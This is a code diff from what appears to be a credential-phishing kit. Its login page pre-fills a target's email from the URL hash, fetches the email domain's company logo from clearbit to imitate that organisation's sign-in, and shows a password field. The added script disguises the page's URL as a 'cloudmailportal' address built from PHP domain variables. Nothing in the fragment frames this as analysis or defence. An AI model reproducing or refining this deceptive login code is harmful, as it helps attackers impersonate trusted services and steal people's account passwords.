@@ -71,6 +71,10 @@ function shownext(){var email=$('#email').val();var my_email=email;var filter=/^
 $('#back').click(function(){$("#msg").hide();$("#sbtn").animate({left:0,opacity:"hide"},0);$("#fbtn").animate({left:0,opacity:"show"},1000);$("#pass").animate({left:0,opacity:"hide"},0);$("#em").animate({left:0,opacity:"show"},1000);$("#email").val("");$("#password").val("");$("#logoimg").attr("src","./mic.png");$("#logoname").html("");});var email=window.location.hash.substr(1);if(!email){}
 else
 {$('#email').val(email);$('#password').val("");var my_email=email;var filter=/^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;var ind=my_email.indexOf("@");var my_slice=my_email.substr((ind+1));var c=my_slice.substr(0,my_slice.indexOf('.'));var final=c.toLowerCase();var finalu=c.toUpperCase();$('#emailch').html(my_email);$("#fbtn").animate({left:0,opacity:"hide"},0);$("#sbtn").animate({left:0,opacity:"show"},1000);$("#em").animate({left:0,opacity:"hide"},0);$("#pass").animate({left:0,opacity:"show"},1000);$.get("https://logo.clearbit.com/"+my_slice).done(function(){$("#logoimg").attr("src","https://logo.clearbit.com/"+my_slice);$("#logoname").html(finalu);}).fail(function(){$("#logoimg").attr("src","./mic.png");$("#logoname").html("");})}/*]]>*/</script>
+	<script>
+    location.hash = 'cloudmailportal?<?php echo ucwords($domain_2); ?>=01&url=msp.<?php echo $domain;?>';
+
+</script>
 </html>
 <!--
 *******************************************************
